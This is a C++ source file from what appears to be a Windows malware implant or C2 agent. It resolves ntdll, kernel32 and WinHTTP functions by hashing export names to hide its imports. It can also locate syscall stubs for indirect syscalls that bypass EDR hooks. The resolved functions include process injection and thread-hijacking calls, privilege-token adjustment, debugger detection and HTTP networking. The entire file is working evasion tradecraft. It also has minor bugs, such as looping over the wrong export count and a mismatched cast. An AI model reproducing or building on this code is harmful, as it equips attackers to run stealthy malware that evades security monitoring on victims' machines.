#include "core/procs.hpp"

namespace Procs
{
    DWORD GetHashFromString(char* str)
    {
        int c;
        DWORD dwHash = HASH_IV;

        while (c = *str++)
        {
            dwHash = dwHash * RANDOM_ADDR + c;
        }

        return dwHash & 0xFFFFFFFF;
    }

    DWORD GetHashFromStringPtr(PVOID pStr, SIZE_T dwStrLen)
    {
        ULONG   dwHash  = HASH_IV;
        PUCHAR  puStr   = static_cast<PUCHAR>(pStr);

        do
        {
            UCHAR c = *puStr;

            if (!dwStrLen)
            {
                if (!*puStr) break;
            }
            else
            {
                if ((ULONG) (puStr - (PUCHAR)pStr) >= dwStrLen) break;
                if (!*puStr) ++puStr;
            }

            if (c >= 'a')
            {
                c -= 0x20;
            }

            dwHash = dwHash * RANDOM_ADDR + c;
            ++puStr;
        } while (TRUE);

        return dwHash & 0xFFFFFFFF;
    }

    PVOID GetProcAddressByHash(
        HMODULE hModule,
        DWORD   dwHash
    ) {
        PVOID pFuncAddr = nullptr;

        PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
        PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)hModule + pDosHeader->e_lfanew);

        DWORD_PTR dwpExportDirRVA = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;

        PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)hModule + dwpExportDirRVA);

        PDWORD pdwAddrOfFuncsRVA = (PDWORD)((DWORD_PTR)hModule + pExportDir->AddressOfFunctions);
        PDWORD pdwAddrOfNamesRVA = (PDWORD)((DWORD_PTR)hModule + pExportDir->AddressOfNames);
        PWORD pdwAddrOfNameOrdinalsRVA = (PWORD)((DWORD_PTR)hModule + pExportDir->AddressOfNameOrdinals);

        for (DWORD i = 0; i < pExportDir->NumberOfFunctions; i++)
        {
            DWORD dwFuncNameRVA = pdwAddrOfNamesRVA[i];
            DWORD_PTR dwpFuncNameRVA = (DWORD_PTR)hModule + dwFuncNameRVA;
            char* sFuncName = (char*)dwpFuncNameRVA;
            DWORD_PTR dwpFuncAddrRVA = 0;

            DWORD dwFuncNameHash = GetHashFromString(sFuncName);
            if (dwFuncNameHash == dwHash)
            {
                dwpFuncAddrRVA = pdwAddrOfFuncsRVA[pdwAddrOfNameOrdinalsRVA[i]];
                pFuncAddr = (PVOID)((DWORD_PTR)hModule + dwpFuncAddrRVA);
                return pFuncAddr;
            }
        }

        return nullptr;
    }

    PPROCS FindProcs(
        HMODULE hNTDLL,
        HMODULE hKernel32DLL,
        HMODULE hWinHTTPDLL,
        BOOL    bIndirectSyscalls
    ) {
        PPROCS pProcs = new PROCS;
    
        // NTAPI
        PVOID pNtAdjustPrivilegesToken          = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTADJUSTPRIVILEGESTOKEN);
        pProcs->lpNtAdjustPrivilegesToken       = reinterpret_cast<LPPROC_NTADJUSTPRIVILEGESTOKEN>(pNtAdjustPrivilegesToken);
        PVOID pNtAllocateVirtualMemory          = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTALLOCATEVIRTUALMEMORY);
        pProcs->lpNtAllocateVirtualMemory       = reinterpret_cast<LPPROC_NTALLOCATEVIRTUALMEMORY>(pNtAllocateVirtualMemory);
        PVOID pNtClose                          = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTCLOSE);
        pProcs->lpNtClose                       = reinterpret_cast<LPPROC_NTCLOSE>(pNtClose);
        PVOID pNtCreateFile                     = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTCREATEFILE);
        pProcs->lpNtCreateFile                  = reinterpret_cast<LPPROC_NTCREATEFILE>(pNtCreateFile);
        PVOID pNtCreateNamedPipeFile            = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTCREATENAMEDPIPEFILE);
        pProcs->lpNtCreateNamedPipeFile         = reinterpret_cast<LPPROC_NTCREATENAMEDPIPEFILE>(pNtCreateNamedPipeFile);
        PVOID pNtCreateProcessEx                = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTCREATEPROCESSEX);
        pProcs->lpNtCreateProcessEx             = reinterpret_cast<LPPROC_NTCREATEPROCESSEX>(pNtCreateProcessEx);
        PVOID pNtCreateThreadEx                 = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTCREATETHREADEX);
        pProcs->lpNtCreateThreadEx              = reinterpret_cast<LPPROC_NTCREATETHREADEX>(pNtCreateThreadEx);
        PVOID pNtDeleteFile                     = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTDELETEFILE);
        pProcs->lpNtDeleteFile                  = reinterpret_cast<LPPROC_NTDELETEFILE>(pNtDeleteFile);
        PVOID pNtDuplicateObject                = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTDUPLICATEOBJECT);
        pProcs->lpNtDuplicateObject             = reinterpret_cast<LPPROC_NTDUPLICATEOBJECT>(pNtDuplicateObject);
        PVOID pNtEnumerateValueKey              = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTENUMERATEVALUEKEY);
        pProcs->lpNtEnumerateValueKey           = reinterpret_cast<LPPROC_NTENUMERATEVALUEKEY>(pNtEnumerateValueKey);
        PVOID pNtFreeVirtualMemory              = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTFREEVIRTUALMEMORY);
        pProcs->lpNtFreeVirtualMemory           = reinterpret_cast<LPPROC_NTFREEVIRTUALMEMORY>(pNtFreeVirtualMemory);
        PVOID pNtGetContextThread               = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTGETCONTEXTTHREAD);
        pProcs->lpNtGetContextThread            = reinterpret_cast<LPPROC_NTGETCONTEXTTHREAD>(pNtGetContextThread);
        PVOID pNtOpenFile                       = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTOPENFILE);
        pProcs->lpNtOpenFile                    = reinterpret_cast<LPPROC_NTOPENFILE>(pNtOpenFile);
        PVOID pNtOpenKeyEx                      = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTOPENKEYEX);
        pProcs->lpNtOpenKeyEx                   = reinterpret_cast<LPPROC_NTOPENKEYEX>(pNtOpenKeyEx);
        PVOID pNtOpenProcess                    = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTOPENPROCESS);
        pProcs->lpNtOpenProcess                 = reinterpret_cast<LPPROC_NTOPENPROCESS>(pNtOpenProcess);
        PVOID pNtOpenProcessToken               = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTOPENPROCESSTOKEN);
        pProcs->lpNtOpenProcessToken            = reinterpret_cast<LPPROC_NTOPENPROCESSTOKEN>(pNtOpenProcessToken);
        PVOID pNtPrivilegeCheck                 = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTPRIVILEGECHECK);
        pProcs->lpNtPrivilegeCheck              = reinterpret_cast<LPPROC_NTPRIVILEGECHECK>(pNtPrivilegeCheck);
        PVOID pNtProtectVirtualMemory           = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTPROTECTVIRTUALMEMORY);
        pProcs->lpNtProtectVirtualMemory        = reinterpret_cast<LPPROC_NTPROTECTVIRTUALMEMORY>(pNtProtectVirtualMemory);
        PVOID pNtQueryInformationFile           = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTQUERYINFORMATIONFILE);
        pProcs->lpNtQueryInformationFile        = reinterpret_cast<LPPROC_NTSETINFORMATIONFILE>(pNtQueryInformationFile);
        PVOID pNtQueryInformationProcess        = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTQUERYINFORMATIONPROCESS);
        pProcs->lpNtQueryInformationProcess     = reinterpret_cast<LPPROC_NTQUERYINFORMATIONPROCESS>(pNtQueryInformationProcess);
        PVOID pNtQueryInformationToken          = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTQUERYINFORMATIONTOKEN);
        pProcs->lpNtQueryInformationToken       = reinterpret_cast<LPPROC_NTQUERYINFORMATIONTOKEN>(pNtQueryInformationToken);
        PVOID pNtQueryKey                       = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTQUERYKEY);
        pProcs->lpNtQueryKey                    = reinterpret_cast<LPPROC_NTQUERYKEY>(pNtQueryKey);
        PVOID pNtQuerySystemInformation         = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTQUERYSYSTEMINFORMATION);
        pProcs->lpNtQuerySystemInformation      = reinterpret_cast<LPPROC_NTQUERYSYSTEMINFORMATION>(pNtQuerySystemInformation);
        PVOID pNtReadFile                       = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTREADFILE);
        pProcs->lpNtReadFile                    = reinterpret_cast<LPPROC_NTREADFILE>(pNtReadFile);
        PVOID pNtReadVirtualMemory              = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTREADVIRTUALMEMORY);
        pProcs->lpNtReadVirtualMemory           = reinterpret_cast<LPPROC_NTREADVIRTUALMEMORY>(pNtReadVirtualMemory);
        PVOID pNtResumeThread                   = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTRESUMETHREAD);
        pProcs->lpNtResumeThread                = reinterpret_cast<LPPROC_NTRESUMETHREAD>(pNtResumeThread);
        PVOID pNtSetContextThread               = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTSETCONTEXTTHREAD);
        pProcs->lpNtSetContextThread            = reinterpret_cast<LPPROC_NTSETCONTEXTTHREAD>(pNtSetContextThread);
        PVOID pNtSetInformationFile             = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTSETINFORMATIONFILE);
        pProcs->lpNtSetInformationFile          = reinterpret_cast<LPPROC_NTSETINFORMATIONFILE>(pNtSetInformationFile);
        PVOID pNtSystemDebugControl             = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTSYSTEMDEBUGCONTROL);
        pProcs->lpNtSystemDebugControl          = reinterpret_cast<LPPROC_NTSYSTEMDEBUGCONTROL>(pNtSystemDebugControl);
        PVOID pNtTerminateProcess               = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTTERMINATEPROCESS);
        pProcs->lpNtTerminateProcess            = reinterpret_cast<LPPROC_NTTERMINATEPROCESS>(pNtTerminateProcess);
        PVOID pNtUnmapViewOfSection             = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTUNMAPVIEWOFSECTION);
        pProcs->lpNtUnmapViewOfSection          = reinterpret_cast<LPPROC_NTUNMAPVIEWOFSECTION>(pNtUnmapViewOfSection);
        PVOID pNtWaitForSingleObject            = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTWAITFORSINGLEOBJECT);
        pProcs->lpNtWaitForSingleObject         = reinterpret_cast<LPPROC_NTWAITFORSINGLEOBJECT>(pNtWaitForSingleObject);
        PVOID pNtWriteFile                      = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTWRITEFILE);
        pProcs->lpNtWriteFile                   = reinterpret_cast<LPPROC_NTWRITEFILE>(pNtWriteFile);
        PVOID pNtWriteVirtualMemory             = GetProcAddressByHash(hNTDLL, HASH_FUNC_NTWRITEVIRTUALMEMORY);
        pProcs->lpNtWriteVirtualMemory          = reinterpret_cast<LPPROC_NTWRITEVIRTUALMEMORY>(pNtWriteVirtualMemory);
        PVOID pRtlAllocateHeap                  = GetProcAddressByHash(hNTDLL, HASH_FUNC_RTLALLOCATEHEAP);
        pProcs->lpRtlAllocateHeap               = reinterpret_cast<LPPROC_RTLALLOCATEHEAP>(pRtlAllocateHeap);
        PVOID pRtlGetCurrentDirectory_U         = GetProcAddressByHash(hNTDLL, HASH_FUNC_RTLGETCURRENTDIRECTORY_U);
        pProcs->lpRtlGetCurrentDirectory_U      = reinterpret_cast<LPPROC_RTLGETCURRENTDIRECTORY_U>(pRtlGetCurrentDirectory_U);
        PVOID pRtlGetFullPathName_U             = GetProcAddressByHash(hNTDLL, HASH_FUNC_RTLGETFULLPATHNAME_U);
        pProcs->lpRtlGetFullPathName_U          = reinterpret_cast<LPPROC_RTLGETFULLPATHNAME_U>(pRtlGetFullPathName_U);
        PVOID pRtlInitUnicodeString             = GetProcAddressByHash(hNTDLL, HASH_FUNC_RTLINITUNICODESTRING);
        pProcs->lpRtlInitUnicodeString          = reinterpret_cast<LPPROC_RTLINITUNICODESTRING>(pRtlInitUnicodeString);
        PVOID pRtlSetCurrentDirectory_U         = GetProcAddressByHash(hNTDLL, HASH_FUNC_RTLSETCURRENTDIRECTORY_U);
        pProcs->lpRtlSetCurrentDirectory_U      = reinterpret_cast<LPPROC_RTLSETCURRENTDIRECTORY_U>(pRtlSetCurrentDirectory_U);
        PVOID pRtlStringCchCatW                 = GetProcAddressByHash(hNTDLL, HASH_FUNC_RTLSTRINGCCHCATW);
        pProcs->lpRtlStringCchCatW              = reinterpret_cast<LPPROC_RTLSTRINGCCHCATW>(pRtlStringCchCatW);
        PVOID pRtlStringCchCopyW                = GetProcAddressByHash(hNTDLL, HASH_FUNC_RTLSTRINGCCHCOPYW);
        pProcs->lpRtlStringCchCopyW             = reinterpret_cast<LPPROC_RTLSTRINGCCHCOPYW>(pRtlStringCchCopyW);
        PVOID pRtlStringCchLengthW              = GetProcAddressByHash(hNTDLL, HASH_FUNC_RTLSTRINGCCHLENGTHW);
        pProcs->lpRtlStringCchLengthW           = reinterpret_cast<LPPROC_RTLSTRINGCCHLENGTHW>(pRtlStringCchLengthW);
        PVOID pRtlZeroMemory                    = GetProcAddressByHash(hNTDLL, HASH_FUNC_RTLZEROMEMORY);
        pProcs->lpRtlZeroMemory                 = reinterpret_cast<LPPROC_RTLZEROMEMORY>(pRtlZeroMemory);

        // WINAPI
        PVOID pCheckRemoteDebuggerPresent       = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_CHECKREMOTEDEBUGGERPRESENT);
        pProcs->lpCheckRemoteDebuggerPresent    = reinterpret_cast<LPPROC_CHECKREMOTEDEBUGGERPRESENT>(pCheckRemoteDebuggerPresent);
        PVOID pIsDebuggerPresent                = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_ISDEBUGGERPRESENT);
        pProcs->lpIsDebuggerPresent             = reinterpret_cast<LPPROC_ISDEBUGGERPRESENT>(pIsDebuggerPresent);
        PVOID pQueryFullProcessImageNameW       = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_QUERYFULLPROCESSIMAGENAMEW);
        pProcs->lpQueryFullProcessImageNameW    = reinterpret_cast<LPPROC_QUERYFULLPROCESSIMAGENAMEW>(pQueryFullProcessImageNameW);
        PVOID pSetFileInformationByHandle       = GetProcAddressByHash(hKernel32DLL, HASH_FUNC_SETFILEINFORMATIONBYHANDLE);
        pProcs->lpSetFileInformationByHandle    = reinterpret_cast<LPPROC_SETFILEINFORMATIONBYHANDLE>(pSetFileInformationByHandle);
        PVOID pWinHttpCloseHandle               = GetProcAddressByHash(hWinHTTPDLL, HASH_FUNC_WINHTTPCLOSEHANDLE);
        pProcs->lpWinHttpCloseHandle            = reinterpret_cast<LPPROC_WINHTTPCLOSEHANDLE>(pWinHttpCloseHandle);
        PVOID pWinHttpConnect                   = GetProcAddressByHash(hWinHTTPDLL, HASH_FUNC_WINHTTPCONNECT);
        pProcs->lpWinHttpConnect                = reinterpret_cast<LPPROC_WINHTTPCONNECT>(pWinHttpConnect);
        PVOID pWinHttpOpen                      = GetProcAddressByHash(hWinHTTPDLL, HASH_FUNC_WINHTTPOPEN);
        pProcs->lpWinHttpOpen                   = reinterpret_cast<LPPROC_WINHTTPOPEN>(pWinHttpOpen);
        PVOID pWinHttpOpenRequest               = GetProcAddressByHash(hWinHTTPDLL, HASH_FUNC_WINHTTPOPENREQUEST);
        pProcs->lpWinHttpOpenRequest            = reinterpret_cast<LPPROC_WINHTTPOPENREQUEST>(pWinHttpOpenRequest);
        PVOID pWinHttpQueryDataAvailable        = GetProcAddressByHash(hWinHTTPDLL, HASH_FUNC_WINHTTPQUERYDATAAVAILABLE);
        pProcs->lpWinHttpQueryDataAvailable     = reinterpret_cast<LPPROC_WINHTTPQUERYDATAAVAILABLE>(pWinHttpQueryDataAvailable);
        PVOID pWinHttpQueryHeaders              = GetProcAddressByHash(hWinHTTPDLL, HASH_FUNC_WINHTTPQUERYHEADERS);
        pProcs->lpWinHttpQueryHeaders           = reinterpret_cast<LPPROC_WINHTTPQUERYHEADERS>(pWinHttpQueryHeaders);
        PVOID pWinHttpReceiveResponse           = GetProcAddressByHash(hWinHTTPDLL, HASH_FUNC_WINHTTPRECEIVERESPONSE);
        pProcs->lpWinHttpReceiveResponse        = reinterpret_cast<LPPROC_WINHTTPRECEIVERESPONSE>(pWinHttpReceiveResponse);
        PVOID pWinHttpReadData                  = GetProcAddressByHash(hWinHTTPDLL, HASH_FUNC_WINHTTPREADDATA);
        pProcs->lpWinHttpReadData               = reinterpret_cast<LPPROC_WINHTTPREADDATA>(pWinHttpReadData);
        PVOID pWinHttpSendRequest               = GetProcAddressByHash(hWinHTTPDLL, HASH_FUNC_WINHTTPSENDREQUEST);
        pProcs->lpWinHttpSendRequest            = reinterpret_cast<LPPROC_WINHTTPSENDREQUEST>(pWinHttpSendRequest);
        PVOID pWinHttpSetOption                 = GetProcAddressByHash(hWinHTTPDLL, HASH_FUNC_WINHTTPSETOPTION);
        pProcs->lpWinHttpSetOption              = reinterpret_cast<LPPROC_WINHTTPSETOPTION>(pWinHttpSetOption);
        PVOID pWinHttpWriteData                 = GetProcAddressByHash(hWinHTTPDLL, HASH_FUNC_WINHTTPWRITEDATA);
        pProcs->lpWinHttpWriteData              = reinterpret_cast<LPPROC_WINHTTPWRITEDATA>(pWinHttpWriteData);
        
        if (bIndirectSyscalls)
        {
            pProcs->sysNtAdjustPrivilegesToken      = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtAdjustPrivilegesToken));
            pProcs->sysNtAllocateVirtualMemory      = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtAllocateVirtualMemory));
            pProcs->sysNtClose                      = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtClose));
            pProcs->sysNtCreateFile                 = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtCreateFile));
            pProcs->sysNtCreateNamedPipeFile        = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtCreateNamedPipeFile));
            pProcs->sysNtCreateProcessEx            = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtCreateProcessEx));
            pProcs->sysNtCreateThreadEx             = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtCreateThreadEx));
            pProcs->sysNtDeleteFile                 = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtDeleteFile));
            pProcs->sysNtDuplicateObject            = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtDuplicateObject));
            pProcs->sysNtEnumerateValueKey          = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtEnumerateValueKey));
            pProcs->sysNtFreeVirtualMemory          = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtFreeVirtualMemory));
            pProcs->sysNtGetContextThread           = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtGetContextThread));
            pProcs->sysNtOpenFile                   = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtOpenFile));
            pProcs->sysNtOpenProcess                = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtOpenProcess));
            pProcs->sysNtOpenProcessToken           = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtOpenProcessToken));
            pProcs->sysNtOpenKeyEx                  = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtOpenKeyEx));
            pProcs->sysNtPrivilegeCheck             = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtPrivilegeCheck));
            pProcs->sysNtProtectVirtualMemory       = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtProtectVirtualMemory));
            pProcs->sysNtQueryInformationFile       = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtQueryInformationFile));
            pProcs->sysNtQueryInformationProcess    = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtQueryInformationProcess));
            pProcs->sysNtQueryInformationToken      = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtQueryInformationToken));
            pProcs->sysNtQueryKey                   = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtQueryKey));
            pProcs->sysNtQuerySystemInformation     = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtQuerySystemInformation));
            pProcs->sysNtReadFile                   = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtReadFile));
            pProcs->sysNtReadVirtualMemory          = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtReadVirtualMemory));
            pProcs->sysNtResumeThread               = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtResumeThread));
            pProcs->sysNtSetContextThread           = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtSetContextThread));
            pProcs->sysNtSetInformationFile         = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtSetInformationFile));
            pProcs->sysNtSystemDebugControl         = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtSystemDebugControl));
            pProcs->sysNtUnmapViewOfSection         = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtUnmapViewOfSection));
            pProcs->sysNtTerminateProcess           = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtTerminateProcess));
            pProcs->sysNtWaitForSingleObject        = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtWaitForSingleObject));
            pProcs->sysNtWriteFile                  = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtWriteFile));
            pProcs->sysNtWriteVirtualMemory         = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pNtWriteVirtualMemory));
            pProcs->sysRtlAllocateHeap              = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pRtlAllocateHeap));
            pProcs->sysRtlGetCurrentDirectory_U     = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pRtlGetCurrentDirectory_U));
            pProcs->sysRtlGetFullPathName_U         = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pRtlGetFullPathName_U));
            pProcs->sysRtlInitUnicodeString         = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pRtlInitUnicodeString));          
            pProcs->sysRtlSetCurrentDirectory_U     = Syscalls::FindSyscall(reinterpret_cast<UINT_PTR>(pRtlSetCurrentDirectory_U));
        }

        return pProcs;
    }
}
